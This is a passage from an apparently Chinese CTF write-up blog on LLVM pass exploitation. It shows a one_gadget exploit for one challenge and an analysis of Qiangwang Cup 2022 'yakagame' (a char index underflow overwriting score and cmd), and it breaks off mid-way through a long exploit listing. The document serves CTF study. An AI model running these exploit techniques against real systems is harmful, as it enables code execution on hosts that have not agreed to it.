<p><code>tcache</code>有一个<code>0x20</code>的<code>chunk</code>，随后就会从<code>smallbins</code>中申请，那么申请两次之后，得到残留<code>libc</code>的<code>chunk</code>，然后使用<code>stealkey</code>将残留<code>libc</code>赋值给<code>byte_204100</code>，之后又使用<code>fakekey</code>进行修改将<code>byte_204100</code>的残留<code>libc</code>进行加减操作得到<code>one_gadget</code>，赋值给<code>*byte_2040f8</code>，通过<code>run</code>调用<code>*byte_2040f8</code>即可调用到<code>one_gadget</code>。</p>
<p>最终<code>exp</code>如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stealkey</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fakekey</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1ecbf0</span>+<span class="number">0xe3afe</span>);</span><br><span class="line">    run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="强网杯-2022-yakagame"   >
          <a href="#强网杯-2022-yakagame" class="heading-link"><i class="fas fa-link"></i></a><a href="#强网杯-2022-yakagame" class="headerlink" title="强网杯-2022 yakagame"></a>强网杯-2022 yakagame</h2>
      
        <h3 id="漏洞分析-2"   >
          <a href="#漏洞分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>直接<code>shift+F12</code>查看字符串，发现<code>flag</code>，交叉引用进入查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145039943.png" alt="image-20230829145039943"></p>
<p><code>sub_C650</code>查看是注册函数，依照惯例注册名应该为<code>ayaka</code>通过<code>vtable</code>找到<code>runOnFunction</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145538577.png" alt="image-20230829145538577"></p>
<p>处理函数为<code>gamestart</code>，分析找到内部处理函数有<code>fight</code>，并且满足<code>score</code>达成目标之后可以调用到后门，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145854503.png" alt="image-20230829145854503"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145951845.png" alt="image-20230829145951845"></p>
<p>那么主要分析点就是如何操作的<code>score</code>以及<code>cmd</code>如何赋值。经过分析，重点的漏洞在<code>else</code>分支</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829171103523.png" alt="image-20230829171103523"></p>
<p>在<code>else</code>分支中，不满足以上所有函数的匹配的其他函数，会进入该分支，遍历<code>funMap</code>，如果<code>funMap</code>中存在对应关系<code>funMap[func_name] = value</code>，则作<code>weaponlist[idx] = value</code>操作，如果不存在，则添加对应关系<code>funMap[func_name] = value</code></p>
<p>这里的<code>idx</code>是<code>char</code>型的，在每一次进入<code>else</code>分支都会进行遍历<code>funMap</code>的，那么<code>funMap</code>中如果存在很多项，导致匹配到某个已存在的函数时，<code>idx</code>在<code>-128~-1</code>之间，那么就会导致<code>weaponlist</code>数组向上溢出了，从而能够覆盖到在<code>weaponlist</code>上方的<code>score</code>和<code>cmd</code>，完成劫持利用。</p>

        <h3 id="漏洞利用-2"   >
          <a href="#漏洞利用-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>那么就通过计算生成对应<code>idx</code>的函数进行覆盖即可，<code>cmd</code>可以让其指向<code>opt</code>程序中<code>sh</code>的指针，最终<code>winmt</code>师傅的<code>exp</code>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br></pre></td><td class="code"><pre><span class="line">// clang-8 -emit-llvm -S exp.c -o exp.ll</span><br><span class="line">void winmt000(int x);</span><br><span class="line">void winmt001(int x);</span><br><span class="line">void winmt002(int x);</span><br><span class="line">void winmt003(int x);</span><br><span class="line">void winmt004(int x);</span><br><span class="line">void winmt005(int x);</span><br><span class="line">void winmt006(int x);</span><br><span class="line">void winmt007(int x);</span><br><span class="line">void winmt008(int x);</span><br><span class="line">void winmt009(int x);</span><br><span class="line">void winmt010(int x);</span><br><span class="line">void winmt011(int x);</span><br><span class="line">void winmt012(int x);</span><br><span class="line">void winmt013(int x);</span><br><span class="line">void winmt014(int x);</span><br><span class="line">void winmt015(int x);</span><br><span class="line">void winmt016(int x);</span><br><span class="line">void winmt017(int x);</span><br><span class="line">void winmt018(int x);</span><br><span class="line">void winmt019(int x);</span><br><span class="line">void winmt020(int x);</span><br><span class="line">void winmt021(int x);</span><br><span class="line">void winmt022(int x);</span><br><span class="line">void winmt023(int x);</span><br><span class="line">void winmt024(int x);</span><br><span class="line">void winmt025(int x);</span><br><span class="line">void winmt026(int x);</span><br><span class="line">void winmt027(int x);</span><br><span class="line">void winmt028(int x);</span><br><span class="line">void winmt029(int x);</span><br><span class="line">void winmt030(int x);</span><br><span class="line">void winmt031(int x);</span><br><span class="line">void winmt032(int x);</span><br><span class="line">void winmt033(int x);</span><br><span class="line">void winmt034(int x);</span><br><span class="line">void winmt035(int x);</span><br><span class="line">void winmt036(int x);</span><br><span class="line">void winmt037(int x);</span><br><span class="line">void winmt038(int x);</span><br><span class="line">void winmt039(int x);</span><br><span class="line">void winmt040(int x);</span><br><span class="line">void winmt041(int x);</span><br><span class="line">void winmt042(int x);</span><br><span class="line">void winmt043(int x);</span><br><span class="line">void winmt044(int x);</span><br><span class="line">void winmt045(int x);</span><br><span class="line">void winmt046(int x);</span><br><span class="line">void winmt047(int x);</span><br><span class="line">void winmt048(int x);</span><br><span class="line">void winmt049(int x);</span><br><span class="line">void winmt050(int x);</span><br><span class="line">void winmt051(int x);</span><br><span class="line">void winmt052(int x);</span><br><span class="line">void winmt053(int x);</span><br><span class="line">void winmt054(int x);</span><br><span class="line">void winmt055(int x);</span><br><span class="line">void winmt056(int x);</span><br><span class="line">void winmt057(int x);</span><br><span class="line">void winmt058(int x);</span><br><span class="line">void winmt059(int x);</span><br><span class="line">void winmt060(int x);</span><br><span class="line">void winmt061(int x);</span><br><span class="line">void winmt062(int x);</span><br><span class="line">void winmt063(int x);</span><br><span class="line">void winmt064(int x);</span><br><span class="line">void winmt065(int x);</span><br><span class="line">void winmt066(int x);</span><br><span class="line">void winmt067(int x);</span><br><span class="line">void winmt068(int x);</span><br><span class="line">void winmt069(int x);</span><br><span class="line">void winmt070(int x);</span><br><span class="line">void winmt071(int x);</span><br><span class="line">void winmt072(int x);</span><br><span class="line">void winmt073(int x);</span><br><span class="line">void winmt074(int x);</span><br><span class="line">void winmt075(int x);</span><br><span class="line">void winmt076(int x);</span><br><span class="line">void winmt077(int x);</span><br><span class="line">void winmt078(int x);</span><br><span class="line">void winmt079(int x);</span><br><span class="line">void winmt080(int x);</span><br><span class="line">void winmt081(int x);</span><br><span class="line">void winmt082(int x);</span><br><span class="line">void winmt083(int x);</span><br><span class="line">void winmt084(int x);</span><br><span class="line">void winmt085(int x);</span><br><span class="line">void winmt086(int x);</span><br><span class="line">void winmt087(int x);</span><br><span class="line">void winmt088(int x);</span><br><span class="line">void winmt089(int x);</span><br><span class="line">void winmt090(int x);</span><br><span class="line">void winmt091(int x);</span><br><span class="line">void winmt092(int x);</span><br><span class="line">void winmt093(int x);</span><br><span class="line">void winmt094(int x);</span><br><span class="line">void winmt095(int x);</span><br><span class="line">void winmt096(int x);</span><br><span class="line">void winmt097(int x);</span><br><span class="line">void winmt098(int x);</span><br><span class="line">void winmt099(int x);</span><br><span class="line">void winmt100(int x);</span><br><span class="line">void winmt101(int x);</span><br><span class="line">void winmt102(int x);</span><br><span class="line">void winmt103(int x);</span><br><span class="line">void winmt104(int x);</span><br><span class="line">void winmt105(int x);</span><br><span class="line">void winmt106(int x);</span><br><span class="line">void winmt107(int x);</span><br><span class="line">void winmt108(int x);</span><br><span class="line">void winmt109(int x);</span><br><span class="line">void winmt110(int x);</span><br><span class="line">void winmt111(int x);</span><br><span class="line">void winmt112(int x);</span><br><span class="line">void winmt113(int x);</span><br><span class="line">void winmt114(int x);</span><br><span class="line">void winmt115(int x);</span><br><span class="line">void winmt116(int x);</span><br><span class="line">void winmt117(int x);</span><br><span class="line">void winmt118(int x);</span><br><span class="line">void winmt119(int x);</span><br><span class="line">void winmt120(int x);</span><br><span class="line">void winmt121(int x);</span><br><span class="line">void winmt122(int x);</span><br><span class="line">void winmt123(int x);</span><br><span class="line">void winmt124(int x);</span><br><span class="line">void winmt125(int x);</span><br><span class="line">void winmt126(int x);</span><br><span class="line">void winmt127(int x);</span><br><span class="line">void winmt128(int x);</span><br><span class="line">void winmt129(int x);</span><br><span class="line">void winmt130(int x);</span><br><span class="line">void winmt131(int x);</span><br><span class="line">void winmt132(int x);</span><br><span class="line">void winmt133(int x);</span><br><span class="line">void winmt134(int x);</span><br><span class="line">void winmt135(int x);</span><br><span class="line">void winmt136(int x);</span><br><span class="line">void winmt137(int x);</span><br><span class="line">void winmt138(int x);</span><br><span class="line">void winmt139(int x);</span><br><span class="line">void winmt140(int x);</span><br><span class="line">void winmt141(int x);</span><br><span class="line">void winmt142(int x);</span><br><span class="line">void winmt143(int x);</span><br><span class="line">void winmt144(int x);</span><br><span class="line">void winmt145(int x);</span><br><span class="line">void winmt146(int x);</span><br><span class="line">void winmt147(int x);</span><br><span class="line">void winmt148(int x);</span><br><span class="line">void winmt149(int x);</span><br><span class="line">void winmt150(int x);</span><br><span class="line">void winmt151(int x);</span><br><span class="line">void winmt152(int x);</span><br><span class="line">void winmt153(int x);</span><br><span class="line">void winmt154(int x);</span><br><span class="line">void winmt155(int x);</span><br><span class="line">void winmt156(int x);</span><br><span class="line">void winmt157(int x);</span><br><span class="line">void winmt158(int x);</span><br><span class="line">void winmt159(int x);</span><br><span class="line">void winmt160(int x);</span><br><span class="line">void winmt161(int x);</span><br><span class="line">void winmt162(int x);</span><br><span class="line">void winmt163(int x);</span><br><span class="line">void winmt164(int x);</span><br><span class="line">void winmt165(int x);</span><br><span class="line">void winmt166(int x);</span><br><span class="line">void winmt167(int x);</span><br><span class="line">void winmt168(int x);</span><br><span class="line">void winmt169(int x);</span><br><span class="line">void winmt170(int x);</span><br><span class="line">void winmt171(int x);</span><br><span class="line">void winmt172(int x);</span><br><span class="line">void winmt173(int x);</span><br><span class="line">void winmt174(int x);</span><br><span class="line">void winmt175(int x);</span><br><span class="line">void winmt176(int x);</span><br><span class="line">void winmt177(int x);</span><br><span class="line">void winmt178(int x);</span><br><span class="line">void winmt179(int x);</span><br><span class="line">void winmt180(int x);</span><br><span class="line">void winmt181(int x);</span><br><span class="line">void winmt182(int x);</span><br><span class="line">void winmt183(int x);</span><br><span class="line">void winmt184(int x);</span><br><span class="line">void winmt185(int x);</span><br><span class="line">void winmt186(int x);</span><br><span class="line">void winmt187(int x);</span><br><span class="line">void winmt188(int x);</span><br><span class="line">void winmt189(int x);</span><br><span class="line">void winmt190(int x);</span><br><span class="line">void winmt191(int x);</span><br><span class="line">void winmt192(int x);</span><br><span class="line">void winmt193(int x);</span><br><span class="line">void winmt194(int x);</span><br><span class="line">void winmt195(int x);</span><br><span class="line">void winmt196(int x);</span><br><span class="line">void winmt197(int x);</span><br><span class="line">void winmt198(int x);</span><br><span class="line">void winmt199(int x);</span><br><span class="line">void winmt200(int x);</span><br><span class="line">void winmt201(int x);</span><br><span class="line">void winmt202(int x);</span><br><span class="line">void winmt203(int x);</span><br><span class="line">void winmt204(int x);</span><br><span class="line">void winmt205(int x);</span><br><span class="line">void winmt206(int x);</span><br><span class="line">void winmt207(int x);</span><br><span class="line">void winmt208(int x);</span><br><span class="line">void winmt209(int x);</span><br><span class="line">void winmt210(int x);</span><br><span class="line">void winmt211(int x);</span><br><span class="line">void winmt212(int x);</span><br><span class="line">void winmt213(int x);</span><br><span class="line">void winmt214(int x);</span><br><span class="line">void winmt215(int x);</span><br><span class="line">void winmt216(int x);</span><br><span class="line">void winmt217(int x);</span><br><span class="line">void winmt218(int x);</span><br><span class="line">void winmt219(int x);</span><br><span class="line">void winmt220(int x);</span><br><span class="line">void winmt221(int x);</span><br><span class="line">void winmt222(int x);</span><br><span class="line">void winmt223(int x);</span><br><span class="line">void winmt224(int x);</span><br><span class="line">void winmt225(int x);</span><br><span class="line">void winmt226(int x);</span><br><span class="line">void winmt227(int x);</span><br><span class="line">void winmt228(int x);</span><br><span class="line">void winmt229(int x);</span><br><span class="line">void winmt230(int x);</span><br><span class="line">void winmt231(int x);</span><br><span class="line">void winmt232(int x);</span><br><span class="line">void winmt233(int x);</span><br><span class="line">void winmt234(int x);</span><br><span class="line">void winmt235(int x);</span><br><span class="line">void winmt236(int x);</span><br><span class="line">void winmt237(int x);</span><br><span class="line">void winmt238(int x);</span><br><span class="line">void winmt239(int x);</span><br><span class="line">void winmt240(int x);</span><br><span class="line"> </span><br><span class="line">void fight(int x);</span><br><span class="line"> </span><br><span class="line">void gamestart()</span><br><span class="line">&#123;</span><br><span class="line">    winmt000(0);</span><br><span class="line">    winmt001(0);</span><br><span class="line">    winmt002(0);</span><br><span class="line">    winmt003(0);</span><br><span class="line">    winmt004(0);</span><br><span class="line">    winmt005(0);</span><br><span class="line">    winmt006(0);</span><br><span class="line">    winmt007(0);</span><br><span class="line">    winmt008(0);</span><br><span class="line">    winmt009(0);</span><br><span class="line">    winmt010(0);</span><br><span class="line">    winmt011(0);</span><br><span class="line">    winmt012(0);</span><br><span class="line">    winmt013(0);</span><br><span class="line">    winmt014(0);</span><br><span class="line">    winmt015(0);</span><br><span class="line">    winmt016(0);</span><br><span class="line">    winmt017(0);</span><br><span class="line">    winmt018(0);</span><br><span class="line">    winmt019(0);</span><br><span class="line">    winmt020(0);</span><br><span class="line">    winmt021(0);</span><br><span class="line">    winmt022(0);</span><br><span class="line">    winmt023(0);</span><br><span class="line">    winmt024(0);</span><br><span class="line">    winmt025(0);</span><br><span class="line">    winmt026(0);</span><br><span class="line">    winmt027(0);</span><br><span class="line">    winmt028(0);</span><br><span class="line">    winmt029(0);</span><br><span class="line">    winmt030(0);</span><br><span class="line">    winmt031(0);</span><br><span class="line">    winmt032(0);</span><br><span class="line">    winmt033(0);</span><br><span class="line">    winmt034(0);</span><br><span class="line">    winmt035(0);</span><br><span class="line">    winmt036(0);</span><br><span class="line">    winmt037(0);</span><br><span class="line">    winmt038(0);</span><br><span class="line">    winmt039(0);</span><br><span class="line">    winmt040(0);</span><br><span class="line">    winmt041(0);</span><br><span class="line">    winmt042(0);</span><br><span class="line">    winmt043(0);</span><br><span class="line">    winmt044(0);</span><br><span class="line">    winmt045(0);</span><br><span class="line">    winmt046(0);</span><br><span class="line">    winmt047(0);</span><br><span class="line">    winmt048(0);</span><br><span class="line">    winmt049(0);</span><br><span class="line">    winmt050(0);</span><br><span class="line">    winmt051(0);</span><br><span class="line">    winmt052(0);</span><br><span class="line">    winmt053(0);</span><br><span class="line">    winmt054(0);</span><br><span class="line">    winmt055(0);</span><br><span class="line">    winmt056(0);</span><br><span class="line">    winmt057(0);</span><br><span class="line">    winmt058(0);</span><br><span class="line">    winmt059(0);</span><br><span class="line">    winmt060(0);</span><br><span class="line">    winmt061(0);</span><br><span class="line">    winmt062(0);</span><br><span class="line">    winmt063(0);</span><br><span class="line">    winmt064(0);</span><br><span class="line">    winmt065(0);</span><br><span class="line">    winmt066(0);</span><br><span class="line">    winmt067(0);</span><br><span class="line">    winmt068(0);</span><br><span class="line">    winmt069(0);</span><br><span class="line">    winmt070(0);</span><br><span class="line">    winmt071(0);</span><br><span class="line">    winmt072(0);</span><br><span class="line">    winmt073(0);</span><br><span class="line">    winmt074(0);</span><br><span class="line">    winmt075(0);</span><br><span class="line">    winmt076(0);</span><br><span class="line">    winmt077(0);</span><br><span class="line">    winmt078(0);</span><br><span class="line">    winmt079(0);</span><br><span class="line">    winmt080(0);</span><br><span class="line">    winmt081(0);</span><br><span class="line">    winmt082(0);</span><br><span class="line">    winmt083(0);</span><br><span class="line">    winmt084(0);</span><br><span class="line">    winmt085(0);</span><br><span class="line">    winmt086(0);</span><br><span class="line">    winmt087(0);</span><br><span class="line">    winmt088(0);</span><br><span class="line">    winmt089(0);</span><br><span class="line">    winmt090(0);</span><br><span class="line">    winmt091(0);</span><br><span class="line">    winmt092(0);</span><br><span class="line">    winmt093(0);</span><br><span class="line">    winmt094(0);</span><br><span class="line">    winmt095(0);</span><br><span class="line">    winmt096(0);</span><br><span class="line">    winmt097(0);</span><br><span class="line">    winmt098(0);</span><br><span class="line">    winmt099(0);</span><br><span class="line">    winmt100(0);</span><br><span class="line">    winmt101(0);</span><br><span class="line">    winmt102(0);</span><br><span class="line">    winmt103(0);</span><br><span class="line">    winmt104(0);</span><br><span class="line">    winmt105(0);</span><br><span class="line">    winmt106(0);</span><br><span class="line">    winmt107(0);</span><br><span class="line">    winmt108(0);</span><br><span class="line">    winmt109(0);</span><br><span class="line">    winmt110(0);</span><br><span class="line">    winmt111(0);</span><br><span class="line">    winmt112(0);</span><br><span class="line">    winmt113(0);</span><br><span class="line">    winmt114(0);</span><br><span class="line">    winmt115(0);</span><br><span class="line">    winmt116(0);</span><br><span class="line">    winmt117(0);</span><br><span class="line">    winmt118(0);</span><br><span class="line">    winmt119(0);</span><br><span class="line">    winmt120(0);</span><br><span class="line">    winmt121(0);</span><br><span class="line">    winmt122(0);</span><br><span class="line">    winmt123(0);</span><br><span class="line">    winmt124(0);</span><br><span class="line">    winmt125(0);</span><br><span class="line">    winmt126(0);</span><br><span class="line">    winmt127(0);</span><br><span class="line">    winmt128(0);</span><br><span class="line">    winmt129(0);</span><br><span class="line">    winmt130(0);</span><br><span class="line">    winmt131(0);</span><br><span class="line">    